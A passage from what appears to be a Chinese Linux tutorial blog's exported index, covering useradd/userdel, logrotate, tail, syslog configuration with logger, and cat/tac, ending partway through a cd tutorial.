    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F9.%20Linux%20%E5%A2%9E%E5%8A%A0%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7%2F</url>
    <content type="text"><![CDATA[Linux 增加删除用户1.增加用户&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令：useradd&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;语法： 1useradd [-u UID] [-g GID] [-d HOME] [-M] [-s] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;参数： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-u：自定义UID &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-g：使其属于已经存在的某个组，后面可以分组 id ，也可以分组名 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-d：自定义用户的家目录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-M：不建立家目录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-s：自定义 shell &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;‘useradd’ 不加任何选项直接跟用户名，则会创建一个跟用户名同样名字的组。 12345[root@localhost ~]# useradd test10[root@localhost ~]# tail -n1 /etc/passwdtest10:x:500:503::/home/test10:/bin/bash[root@localhost ~]# tail -n1 /etc/grouptest10:x:503: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;‘-g’ 选项后面跟一个不存在的gid会报错，提示该组不存在。 12345678910[root@localhost ~]# useradd -u510 -g 513 -M -s /sbin/nologin user11useradd: group '513' does not exist[root@localhost ~]# useradd -u510 -g 502 -M -s /sbin/nologin user11[root@localhost ~]# useradd -u511 -g grptest1 user12[root@localhost ~]# tail -n2 /etc/passwduser11:x:510:502::/home/user11:/sbin/nologinuser12:x:511:502::/home/user12:/bin/bash[root@localhost ~]# tail -n2 /etc/groupgrptest1:x:502:test10:x:503: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;‘-M’ 选项加上后则不建立用户家目录，但是在/etc/passwd文件中仍然有这个字段。但是使用 ls /home/user11 查看一下会提示该目录不存在。所以 ‘-M’ 选项的作用只是不创建那个目录。 12[root@localhost ~]# ls /home/user11ls: 无法访问/home/user11: 没有那个文件或目录 2.删除账户&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令：useradd&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;语法： 1userdel [-r] username &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;‘-r’ 选项的作用只有一个，就是删除账户的时候连带账户的家目录一起删除。 12345678910[root@localhost ~]# ls -ld /home/user12drwx------ 3 user12 grptest1 4096 5月 11 07:12 /home/user12[root@localhost ~]# userdel user12[root@localhost ~]# ls -ld /home/user12drwx------ 3 511 grptest1 4096 5月 11 07:12 /home/user12[root@localhost ~]# ls -ld /home/test10/drwx------ 3 test10 test10 4096 5月 11 07:09 /home/test10/[root@localhost ~]# userdel -r test10[root@localhost ~]# ls -ld /home/test10/ls: 无法访问/home/test10/: 没有那个文件或目录]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux日志总管-logrotate]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F66.%20Linux%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%80%BB%E7%AE%A1-logrotate%2F</url>
    <content type="text"><![CDATA[Linux日志总管-logrotate&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;日志文件包含了关于系统中发生的事件的有用信息，在排障过程中或者系统性能分析时经常被用到。对于忙碌的服务器，日志文件大小会增长极快，服务器会很快消耗磁盘空间，这成了个问题。除此之外，处理一个单个的庞大日志文件也常常是件十分棘手的事。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;logrotate是个十分有用的工具，它可以自动对日志进行截断（或轮循）、压缩以及删除旧的日志文件。例如，可以设置logrotate，让/var/log/foo日志文件每30天轮循，并删除超过6个月的日志。配置完后，logrotate的运作完全自动化，不必进行任何进一步的人为干预。另外，旧日志也可以通过电子邮件发送。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主流Linux发行版上都默认安装有logrotate包，如果出于某种原因，logrotate没有出现在里头，可以使用apt-get或yum命令来安装。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Debian或Ubuntu上： 1# apt-get install logrotate cron &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Fedora，CentOS或RHEL上： 1# yum install logrotate crontabs &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;logrotate的配置文件是/etc/logrotate.conf，通常不需要对它进行修改。日志文件的轮循设置在独立的配置文件中，它（们）放在/etc/logrotate.d/目录下。 样例一&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在第一个样例中，我们将创建一个10MB的日志文件/var/log/log-file。我们将展示怎样使用logrotate来管理该日志文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从创建一个日志文件开始，然后在其中填入一个10MB的随机比特流数据。 12# touch /var/log/log-file# head -c 10M &lt; /dev/urandom &gt; /var/log/log-file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于现在日志文件已经准备好，将配置logrotate来轮循该日志文件。让我们为该文件创建一个配置文件。 1234567891011121314# vim /etc/logrotate.d/log-file/var/log/log-file &#123; monthly rotate 5 compress delaycompress missingok notifempty create 644 root root postrotate /usr/bin/killall -HUP rsyslogd endscript &#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 说明 monthly : 日志文件将按月轮循。其它可用值为‘daily’，‘weekly’或者‘yearly’。 rotate 5 : 一次将存储5个归档日志。对于第六个归档，时间最久的归档将被删除。 compress : 在轮循任务完成后，已轮循的归档将使用gzip进行压缩。 delaycompress : 总是与compress选项一起用，delaycompress选项指示logrotate不要将最近的归档压缩，压缩将在下一次轮循周期进行。这在你或任何软件仍然需要读取最新归档时很有用。 missingok : 在日志轮循期间，任何错误将被忽略，例如“文件无法找到”之类的错误。 notifempty : 如果日志文件为空，轮循不会进行。 create 644 root root : 以指定的权限创建全新的日志文件，同时logrotate也会重命名原始日志文件。 postrotate/endscript : 在所有其它指令完成后，postrotate和endscript里面指定的命令将被执行。在这种情况下，rsyslogd 进程将立即再次读取其配置并继续运行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的模板是通用的，而配置参数则根据需求进行调整，不是所有的参数都是必要的。 样例二&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在本例中，只想要轮循一个日志文件，然而日志文件大小可以增长到50MB。 12345678910# vim /etc/logrotate.d/log-file/var/log/log-file &#123; size=50M rotate 5 create 644 root root postrotate /usr/bin/killall -HUP rsyslogd endscript &#125; 样例三&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;想要让旧日志文件以创建日期命名，这可以通过添加dateext常熟实现。 1234567891011# vim /etc/logrotate.d/log-file/var/log/log-file &#123; monthly rotate 5 dateext create 644 root root postrotate /usr/bin/killall -HUP rsyslogd endscript &#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这将让归档文件在它们的文件名中包含日期信息。 排障&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里提供了一些logrotate设置的排障提示。 1. 手动运行logrotate&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; logrotate 可以在任何时候从命令行手动调用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要调用为/etc/lograte.d/下配置的所有日志调用 logrotate ： 1# logrotate /etc/logrotate.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要为某个特定的配置调用logrotate： 1# logrotate /etc/logrotate.d/log-file 2. 演练&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;排障过程中的最佳选择是使用‘-d’选项以预演方式运行logrotate。要进行验证，不用实际轮循任何日志文件，可以模拟演练日志轮循并显示其输出。 1# logrotate -d /etc/logrotate.d/log-file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正如从上面的输出结果可以看到的，logrotate判断该轮循是不必要的。如果文件的时间小于一天，这就会发生了。 3. 强制轮循&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;即使轮循条件没有满足，我们也可以通过使用‘-f’选项来强制logrotate轮循日志文件，‘-v’参数提供了详细的输出。 1234567891011121314151617181920212223242526# logrotate -vf /etc/logrotate.d/log-filereading config file /etc/logrotate.d/log-file reading config info for /var/log/log-file Handling 1 logs rotating pattern: /var/log/log-file forced from command line (5 rotations) empty log files are rotated, old logs are removed considering log /var/log/log-file log needs rotating rotating log /var/log/log-file, log-&gt;rotateCount is 5 dateext suffix '-20140916' glob pattern '-[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]' renaming /var/log/log-file.5.gz to /var/log/log-file.6.gz (rotatecount 5, logstart 1, i 5), old log /var/log/log-file.5.gz does not exist renaming /var/log/log-file.4.gz to /var/log/log-file.5.gz (rotatecount 5, logstart 1, i 4), old log /var/log/log-file.4.gz does not exist . . . renaming /var/log/log-file.0.gz to /var/log/log-file.1.gz (rotatecount 5, logstart 1, i 0), old log /var/log/log-file.0.gz does not exist log /var/log/log-file.6.gz doesn't exist -- won't try to dispose of it renaming /var/log/log-file to /var/log/log-file.1 creating new /var/log/log-file mode = 0644 uid = 0 gid = 0 running postrotate script compressing log with: /bin/gzip 4. Logrotate的记录日志&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;logrotate自身的日志通常存放于/var/lib/logrotate/status目录。如果处于排障目的，我们想要logrotate记录到任何指定的文件，我们可以指定像下面这样从命令行指定。 1# logrotate -vf –s /var/log/logrotate-status /etc/logrotate.d/log-file 5. Logrotate定时任务&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;logrotate需要的cron任务应该在安装时就自动创建了，我把cron文件的内容贴出来，以供大家参考。 12345678910111213141516# cat /etc/cron.daily/logrotate#!/bin/sh # Clean non existent log file entries from status file cd /var/lib/logrotate test -e status || touch status head -1 status &gt; status.clean sed 's/"//g' status | while read logfile date do [ -e "$logfile" ] &amp;&amp; echo "\"$logfile\" $date" done &gt;&gt; status.clean mv status.clean status test -x /usr/sbin/logrotate || exit 0 /usr/sbin/logrotate /etc/logrotate.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;小结一下，logrotate工具对于防止因庞大的日志文件而耗尽存储空间是十分有用的。配置完毕后，进程是全自动的，可以长时间在不需要人为干预下运行。本教程重点关注几个使用logrotate的几个基本样例，你也可以定制它以满足你的需求。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- tail]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F15.%20Linux%20%E5%91%BD%E4%BB%A4-%20tail%2F</url>
    <content type="text"><![CDATA[Linux 命令- tail&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tail 命令从指定点开始将文件写到标准输出.使用tail命令的-f选项可以方便的查阅正在改变的日志文件,tail -f filename会把filename里最尾部的内容显示在屏幕上,并且不但刷新,使你看到最新的文件内容. 命令格式1tail [必要参数] [选择参数] [文件] 命令参数 -f：循环读取 -q：不现实处理信息 -v：显示详细的处理信心 -c&lt;数目&gt;：显示的字节数 -n&lt;行数&gt;：显示行数 –pid=PID：与 -f 合用，表示在进程 ID ，PID 死掉之后结束 -q ，–quiet ，–silent：从不输出给出文件名的首部 -s ，–sleep-interval=S：与 -f 合用，表示在每次反复的间隔休眠 s 秒 使用实例实例1：显示文件末尾内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tail -n 5 log2014.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost test]# tail -n 5 log2014.log 2014-092014-102014-112014-12==============================[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;显示文件最后5行内容 实例2：循环查看文件内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tail -f test.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@localhost ~]# ping 192.168.120.204 &gt; test.log &amp;[1] 11891[root@localhost ~]# tail -f test.log PING 192.168.120.204 (192.168.120.204) 56(84) bytes of data.64 bytes from 192.168.120.204: icmp_seq=1 ttl=64 time=0.038 ms64 bytes from 192.168.120.204: icmp_seq=2 ttl=64 time=0.036 ms64 bytes from 192.168.120.204: icmp_seq=3 ttl=64 time=0.033 ms64 bytes from 192.168.120.204: icmp_seq=4 ttl=64 time=0.027 ms64 bytes from 192.168.120.204: icmp_seq=5 ttl=64 time=0.032 ms64 bytes from 192.168.120.204: icmp_seq=6 ttl=64 time=0.026 ms64 bytes from 192.168.120.204: icmp_seq=7 ttl=64 time=0.030 ms64 bytes from 192.168.120.204: icmp_seq=8 ttl=64 time=0.029 ms64 bytes from 192.168.120.204: icmp_seq=9 ttl=64 time=0.044 ms64 bytes from 192.168.120.204: icmp_seq=10 ttl=64 time=0.033 ms64 bytes from 192.168.120.204: icmp_seq=11 ttl=64 time=0.027 ms[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 1ping 192.168.120.204 &gt; test.log &amp; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在后台 ping 远程主机。并输出文件到 test.log ；这种做法也使用与一个以上的档案监视。用 Ctrl+c 来终止。 实例3：从第5行开始显示文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tail -n +5 log2014.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324[root@localhost test]# cat log2014.log 2014-012014-022014-032014-042014-052014-062014-072014-082014-092014-102014-112014-12==============================[root@localhost test]# tail -n +5 log2014.log2014-052014-062014-072014-082014-092014-102014-112014-12==============================]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux系统日志及日志分析]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F67.%20Linux%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E5%8F%8A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[Linux系统日志及日志分析&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统拥有非常灵活和强大的日志功能，可以保存几乎所有的操作记录，并可以从中检索出我们需要的信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;大部分Linux发行版默认的日志守护进程为 syslog，位于 /etc/syslog 或 /etc/syslogd，默认配置文件为 /etc/syslog.conf，任何希望生成日志的程序都可以向 syslog 发送信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统内核和许多程序会产生各种错误信息、警告信息和其他的提示信息，这些信息对管理员了解系统的运行状态是非常有用的，所以应该把它们写到日志文件中去。完成这个过程的程序就是syslog。syslog可以根据日志的类别和优先级将日志保存到不同的文件中。例如，为了方便查阅，可以把内核信息与其他信息分开，单独保存到一个独立的日志文件中。默认配置下，日志文件通常都保存在“/var/log”目录下。 日志类型&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面是常见的日志类型，但并不是所有的Linux发行版都包含这些类型： 类型 说明 auth 用户认证时产生的日志，如login命令、su命令。 authpriv 与 auth 类似，但是只能被特定用户查看。 console 针对系统控制台的消息。 cron 系统定期执行计划任务时产生的日志。 daemon 某些守护进程产生的日志。 ftp FTP服务。 kern 系统内核消息。 local0.local7 由自定义程序使用。 lpr 与打印机活动有关。 mail 邮件日志。 mark 产生时间戳。系统每隔一段时间向日志文件中输出当前时间，每行的格式类似于 May 26 11:17:09 rs2 – MARK –，可以由此推断系统发生故障的大概时间。 news 网络新闻传输协议(nntp)产生的消息。 ntp 网络时间协议(ntp)产生的消息。 user 用户进程。uucpUUCP子系统。 日志优先级&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;常见的日志优先级请见下标： 优先级 说明 emerg 紧急情况，系统不可用（例如系统崩溃），一般会通知所有用户。 alert 需要立即修复，例如系统数据库损坏。 crit 危险情况，例如硬盘错误，可能会阻碍程序的部分功能。 err 一般错误消息。 warning 警告。 notice 不是错误，但是可能需要处理。 info 通用性消息，一般用来提供有用信息。 debug 调试程序产生的信息。 none 没有优先级，不记录任何日志消息。 常见日志文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所有的系统应用都会在 /var/log 目录下创建日志文件，或创建子目录再创建日志文件。例如： 文件/目录 说明/ var/log/boot.log 开启或重启日志。 /var/log/cron 计划任务日志 /var/log/maillog 邮件日志。 /var/log/messages 该日志文件是许多进程日志文件的汇总，从该文件可以看出任何入侵企图或成功的入侵。 /var/log/httpd 目录 Apache HTTP 服务日志。 /var/log/samba 目录 samba 软件日志 /etc/syslog.conf 文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/syslog.conf 是 syslog 的配置文件，会根据日志类型和优先级来决定将日志保存到何处。典型的 syslog.conf 文件格式如下所示： 123456789101112*.err;kern.debug;auth.notice /dev/consoledaemon,auth.notice /var/log/messageslpr.info /var/log/lpr.logmail.* /var/log/mail.logftp.* /var/log/ftp.logauth.* @see.xidian.edu.cnauth.* root,amroodnetinfo.err /var/log/netinfo.loginstall.* /var/log/install.log*.emerg **.alert |program_namemark.* /dev/console &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一列为日志类型和日志优先级的组合，每个类型和优先级的组合称为一个选择器；后面一列为保存日志的文件、服务器，或输出日志的终端。syslog 进程根据选择器决定如何操作日志。 对配置文件的几点说明： 日志类型和优先级由点号(.)分开，例如 kern.debug 表示由内核产生的调试信息。 kern.debug 的优先级大于 debug。 星号(*)表示所有，例如 *.debug 表示所有类型的调试信息，kern.* 表示由内核产生的所有消息。 可以使用逗号(,)分隔多个日志类型，使用分号(;)分隔多个选择器。 对日志的操作包括： 将日志输出到文件，例如 /var/log/maillog 或 /dev/console。 将消息发送给用户，多个用户用逗号(,)分隔，例如 root, amrood。 通过管道将消息发送给用户程序，注意程序要放在管道符(|)后面。 将消息发送给其他主机上的 syslog 进程，这时 /etc/syslog.conf 文件后面一列为以@开头的主机名，例如@see.xidian.edu.cn。 logger 命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;logger 是Shell命令，可以通过该命令使用 syslog 的系统日志模块，还可以从命令行直接向系统日志文件写入一行信息。 logger命令的语法为：1logger [-i] [-f filename] [-p priority] [-t tag] [message...] 每个选项的含义如下： 选项 说明 -f filename 将 filename 文件的内容作为日志。 -i 每行都记录 logger 进程的ID。 -p priority 指定优先级；优先级必须是形如 facility.priority 的完整的选择器，默认优先级为 user.notice。 -t tag 使用指定的标签标记每一个记录行。 message 要写入的日志内容，多条日志以空格为分隔；如果没有指定日志内容，并且 -f filename 选项为空，那么会把标准输入作为日志内容。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如，将ping命令的结果写入日志： 12345678910111213$ ping 192.168.0.1 | logger -it logger_test -p local3.notice&amp;$ tail -f /var/log/userlogOct 6 12:48:43 kevein logger_test[22484]: PING 192.168.0.1 (192.168.0.1) 56(84) bytes of data.Oct 6 12:48:43 kevein logger_test[22484]: 64 bytes from 192.168.0.1: icmp_seq=1 ttl=253 time=49.7 msOct 6 12:48:44 kevein logger_test[22484]: 64 bytes from 192.168.0.1: icmp_seq=2 ttl=253 time=68.4 msOct 6 12:48:45 kevein logger_test[22484]: 64 bytes from 192.168.0.1: icmp_seq=3 ttl=253 time=315 msOct 6 12:48:46 kevein logger_test[22484]: 64 bytes from 192.168.0.1: icmp_seq=4 ttl=253 time=279 msOct 6 12:48:47 kevein logger_test[22484]: 64 bytes from 192.168.0.1: icmp_seq=5 ttl=253 time=347 msOct 6 12:48:49 kevein logger_test[22484]: 64 bytes from 192.168.0.1: icmp_seq=6 ttl=253 time=701 msOct 6 12:48:50 kevein logger_test[22484]: 64 bytes from 192.168.0.1: icmp_seq=7 ttl=253 time=591 msOct 6 12:48:51 kevein logger_test[22484]: 64 bytes from 192.168.0.1: icmp_seq=8 ttl=253 time=592 msOct 6 12:48:52 kevein logger_test[22484]: 64 bytes from 192.168.0.1: icmp_seq=9 ttl=253 time=611 msOct 6 12:48:53 kevein logger_test[22484]: 64 bytes from 192.168.0.1: icmp_seq=10 ttl=253 time=931 ms &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ping命令的结果成功输出到 /var/log/userlog 文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 logger -it logger_test -p local3.notice 各选项的含义： -i：在每行都记录进程ID； -t logger_test：每行记录都加上“logger_test”这个标签； -p local3.notice：设置日志类型和优先级。 日志转储&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;日志转储也叫日志回卷或日志轮转。Linux中的日志通常增长很快，会占用大量硬盘空间，需要在日志文件达到指定大小时分开存储。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;syslog 只负责接收日志并保存到相应的文件，但不会对日志文件进行管理，因此经常会造成日志文件过大，尤其是WEB服务器，轻易就能超过1G，给检索带来困难。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;大多数Linux发行版使用 logrotate 或 newsyslog 对日志进行管理。logrotate 程序不但可以压缩日志文件，减少存储空间，还可以将日志发送到指定 E-mail，方便管理员及时查看日志。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如，规定邮件日志 /var/log/maillog 超过1G时转储，每周一次，那么每隔一周 logrotate 进程就会检查 /var/log/maillog 文件的大小： 如果没有超过1G，不进行任何操作。 如果在1G~2G之间，就会创建新文件 /var/log/maillog.1，并将多出的1G日志转移到该文件，以给 /var/log/maillog 文件瘦身。 如果在2G~3G之间，会继续创建新文件 /var/log/maillog.2，并将 /var/log/maillog.1 的内容转移到该文件，将 /var/log/maillog 的内容转移到 /var/log/maillog.1，以保持 /var/log/maillog 文件不超过1G。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以看到，每次转存都会创建一个新文件（如果不存在），命名格式为日志文件名加一个数字（从1开始自动增长），以保持当前日志文件和转存后的日志文件不超过指定大小。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;logrotate 的主要配置文件是 /etc/logrotate.conf，/etc/logrotate.d 目录是对 /etc/logrotate.conf 的补充，或者说为了不使 /etc/logrotate.conf 过大而设置。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以通过 cat 命令查看它的内容： 123456789101112131415161718$cat /etc/logrotate.conf# see "man logrotate" for details //可以查看帮助文档# rotate log files weeklyweekly //设置每周转储一次# keep 4 weeks worth of backlogsrotate 4 //最多转储4次# create new (empty) log files after rotating old onescreate //当转储后文件不存储时创建它# uncomment this if you want your log files compressed#compress //以压缩方式转储# RPM packages drop log rotation information into this directoryinclude /etc/logrotate.d //其他日志文件的转储方式，包含在该目录下# no packages own wtmp -- we'll rotate them here/var/log/wtmp &#123; //设置/var/log/wtmp日志文件的转储参数 monthly //每月转储 create 0664 root utmp //转储后文件不存在时创建它，文件所有者为root，所属组为utmp，对应的权限为0664 rotate 1 //最多转储一次&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：include 允许管理员把多个分散的文件集中到一个，类似于C语言的 #include，将其他文件的内容包含进当前文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;include 非常有用，一些程序会把转储日志的配置文件放在 /etc/logrotate.d 目录，这些配置文件会覆盖或增加 /etc/logrotate.conf 的配置项，如果没有指定相关配置，那么采用 /etc/logrotate.conf 的默认配置。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以，建议将 /etc/logrotate.conf 作为默认配置文件，第三方程序在 /etc/logrotate.d 目录下自定义配置文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;logrotate 也可以作为命令直接运行来修改配置文件。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- cat]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F10.%20Linux%20%E5%91%BD%E4%BB%A4-%20cat%2F</url>
    <content type="text"><![CDATA[Linux 命令- cat&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cat命令的用途是连接文件或标准输入并打印。这个命令常用来显示文件内容，或者将几个文件连接起来显示，或者从标准输入读取内容并显示，它常与重定向符号配合使用。 1．命令格式：1cat [选项] [文件] 2．命令功能：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cat主要有三大功能： 一次显示整个文件:cat filename 从键盘创建一个文件:cat &gt; filename 只能创建新文件,不能编辑已有文件. 将几个文件合并为一个文件:cat file1 file2 &gt; file 3．命令参数： -A –show-all 等价于 -vET -b –number-nonblank 对非空输出行编号 -e 等价于 -vE -E –show-ends 在每行结束处显示 $ -n –number 对输出的所有行编号,由1开始对所有输出的行数编号 -s –squeeze-blank 有连续两行以上的空白行，就代换为一行的空白行 -t 与 -vT 等价 -T –show-tabs 将跳格字符显示为 ^I -u (被忽略) -v –show-nonprinting 使用 ^ 和 M- 引用，除了 LFD 和 TAB 之外 4．使用实例：实例1：把 log2012.log 的文件内容加上行号后输入 log2013.log 这个文件里&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cat -n log2012.log log2013.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567891011121314151617181920212223242526[root@localhost test]# cat log2012.log 2012-012012-02======[root@localhost test]# cat log2013.log 2013-012013-022013-03======[root@localhost test]# cat -n log2012.log log2013.log 1 2012-012 2012-02345 ======6 2013-017 2013-028910 2013-0311 ======[root@localhost test]# 实例2：把 log2012.log 和 log2013.log 的文件内容加上行号（空白行不加）之后将内容附加到 log.log 里。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cat -b log2012.log log2013.log log.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678[root@localhost test]# cat -b log2012.log log2013.log log.log1 2012-012 2012-023 ======4 2013-015 2013-026 2013-037 ======[root@localhost test]# 实例3：把 log2012.log 的文件内容加上行号后输入 log.log 这个文件里&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cat log.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456789[root@localhost test]# cat log.log [root@localhost test]# cat -n log2012.log &gt; log.log[root@localhost test]# cat -n log.log 1 2012-012 2012-02345 ======[root@localhost test]# 实例4：使用here doc来生成文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567891011121314[root@localhost test]# cat &gt;log.txt &lt;&lt;EOF&gt; Hello&gt; World&gt; Linux&gt; PWD=$(pwd)&gt; EOF[root@localhost test]# ls -l log.txt -rw-r--r-- 1 root root 37 10-28 17:07 log.txt[root@localhost test]# cat log.txt HelloWorldLinuxPWD=/opt/soft/test[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意粗体部分，here doc可以进行字符串替换。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备注： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tac (反向列示) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1tac log.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345[root@localhost test]# tac log.txt PWD=/opt/soft/testLinuxWorldHello &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tac 是将 cat 反写过来，所以他的功能就跟 cat 相反， cat 是由第一行到最后一行连续显示在萤幕上，而 tac 则是由最后一行到第一行反向在萤幕上显示出来！]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- cd]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F1.%20Linux%20%E5%91%BD%E4%BB%A4-cd%2F</url>
    <content type="text"><![CDATA[Linux 命令- cd&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux cd 命令可以说是Linux中最基本的命令语句，其他的命令语句要进行操作，都是建立在使用 cd 命令上的。所以，学习Linux 常用命令，首先就要学好 cd 命令的使用方法技巧。 1.命令格式1cd [目录名] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;切换当前目录至dirName 3.常用范例例1：进入系统根目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cd / &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1[root@localhost ~]# cd / &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：进入系统根目录,上面命令执行完后拿ls命令看一下，当前目录已经到系统根目录了 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cd .. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者 1cd .. // &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出: 123456[root@localhost soft]# pwd/opt/soft[root@localhost soft]# cd ..[root@localhost opt]# cd ..//[root@localhost /]# pwd/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;进入系统根目录可以使用“ cd .. ”一直退，就可以到达根目录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cd ../.. // &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 